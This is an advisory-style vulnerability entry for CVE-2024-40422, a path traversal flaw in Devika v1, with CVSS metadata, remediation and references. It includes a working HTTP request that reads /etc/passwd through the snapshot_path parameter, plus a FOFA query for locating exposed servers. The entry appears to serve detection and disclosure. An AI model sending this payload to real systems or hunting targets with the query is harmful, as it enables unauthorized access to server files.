---
layout: post
cve_id: CVE-2024-40422
title: Devika v1 - Path Traversal
pcap: true
pcap_path: /pcaps/2024/CVE-2024-40422.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-40422.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io,alpernae
severity: critical
impact: 'Unauthenticated attackers can exploit path traversal to access sensitive
  files on the server.

  '
remediation: 'Update Devika to a version later than v1 that patches the path traversal
  vulnerability.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-40422
- https://cvefeed.io/vuln/detail/CVE-2024-40422
- https://github.com/alpernae/CVE-2024-40422
- https://github.com/stitionai/devika
- https://www.exploit-db.com/exploits/52066
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 9.1
  cve-id: CVE-2024-40422
  cwe-id: CWE-22
  epss-score: 0.92895
  epss-percentile: 0.99758
  cpe: cpe:2.3:a:stitionai:devika:1.0:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: stitionai
  product: devika
  fofa-query: icon_hash="-1429839495"
tags:
- cve
- cve2024
- devika
- lfi
- vuln
---

## üîç Vulnerability Description
The snapshot_path parameter in the /api/get-browser-snapshot endpoint in stitionai devika v1 is susceptible to a path traversal attack. An attacker can manipulate the snapshot_path parameter to traverse directories and access sensitive files on the server. This can potentially lead to unauthorized access to critical system files and compromise the confidentiality and integrity of the system.


## üåê HTTP Request
```nohighlight
GET /api/data HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.11
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /api/get-browser-snapshot?snapshot_path=../../../../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

